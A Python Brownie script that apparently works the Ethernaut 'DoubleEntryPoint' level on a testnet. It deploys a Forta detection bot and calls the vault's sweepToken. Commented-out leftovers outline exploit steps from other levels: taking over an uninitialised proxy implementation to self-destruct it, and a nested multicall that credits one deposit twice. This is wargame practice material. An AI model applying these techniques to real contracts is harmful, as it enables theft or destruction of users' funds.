from ctypes import addressof
from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from brownie.convert import *
from web3 import Web3

import time
import json
import os

# for local deployment: 


# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# DEV deployment
# deployer=accounts[0]
# deployer=accounts[0]
# attacker=accounts[1]
# cryptoVault=CryptoVault.deploy('0x4070cC66609234028E079FbdC42133c32fCd5225', {'from': deployer, 'priority_fee': priority_fee})

acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x8D424c271aF7f90111D8B2c9d669a4B1650d1D04'
doubleentry=interface.DoubleEntryPoint(target_address)


# attacker.transfer(target_ct.address, 100000000000, priority_fee=priority_fee)

def main():

    print('--- values addresses ---')
    print('doubleentry:', doubleentry.address)
    print('delegatedFrom:', doubleentry.delegatedFrom())
    print('forta:', doubleentry.forta())
    print('player:', doubleentry.player())
    print('cryptoVault:', doubleentry.cryptoVault())
    print('attacker:', attacker)


    cryptoVault=interface.CryptoVault(doubleentry.cryptoVault())
    print('cryptoVault.sweptTokensRecipient():', cryptoVault.sweptTokensRecipient())
    print('cryptoVault.underlying():', cryptoVault.underlying())

    # tx=cryptoVault.sweepToken('0x4070cC66609234028E079FbdC42133c32fCd5225', {'from': attacker, 'priority_fee': priority_fee})

    legacy=interface.LegacyToken(doubleentry.delegatedFrom())
    print('LegacyToken.delegate(): ', legacy.delegate())
    forta=interface.Forta(doubleentry.forta())

    # deploy bot contract
    bot=FortaBot.deploy(forta.address, cryptoVault.address, {'from': attacker, 'priority_fee': priority_fee})

    # set the forta bot address in the Forta contract
    tx_set_bot=forta.setDetectionBot(bot.address, {'from': attacker, 'priority_fee': priority_fee})

    print('--- values BEFORE attack ---')
    print('balance of DET in vault: ', doubleentry.balanceOf(cryptoVault.address))
    print('balance of LGT in vault: ', legacy.balanceOf(cryptoVault.address))

    # the sweeptoken function will do a transfer, the LGT token is delegated to the DET token, this last one will actually execute the transfert
    
    tx_sweep=cryptoVault.sweepToken(legacy, {'from': attacker, 'priority_fee': priority_fee})


    print('--- values AFTER attack ---')

    print('balance of DET in vault: ', doubleentry.balanceOf(cryptoVault.address))
    print('balance of LGT in vault: ', legacy.balanceOf(cryptoVault.address))



    # we execute the initialize function directly on the implementation contract (was supposed to go through the proxy, but there is no control)
    # tx_init=engine.initialize({'from': attacker, 'priority_fee': priority_fee})

    # print('--- values after tx_init ---')
    # print('engine.upgrader(): ', engine.upgrader())
    # print('engine.horsePower(): ', engine.horsePower())

    # >> attecker is now the upgrader
    # now we set the new implemantation address to the address of the attacker contract which will self-destruct in the implementation context

    # data=attacker_contract.self_destruct.encode_input()

    # tx_attack=engine.upgradeToAndCall(attacker_contract.address, data, {'from': attacker, 'priority_fee': priority_fee})

    # print('--- values after tx_attack ---')
    # print('engine.upgrader(): ', engine.upgrader())
    # print('engine.horsePower(): ', engine.horsePower())




    # tx_deposit=puzzleWallet.deposit({'from': attacker, 'priority_fee': priority_fee, 'amount': balance_wallet})

    # # we do a nested tx, multicall inside a multicall in order to bypass the max 1 deposit control and credit the attacker balance twice the amount deposited
    # data1=puzzleWallet.deposit.encode_input()
    # calldata2=[data1]
    # data2=puzzleWallet.multicall.encode_input(calldata2)
    # print('data1: ', data1)
    # print('data2: ', data2)

    # calldata=[data1,data2]

    # tx_nested_multi=puzzleWallet.multicall(calldata, {'from': attacker, 'priority_fee': priority_fee, 'amount': balance_wallet})

    print('--- It is over ---')
    
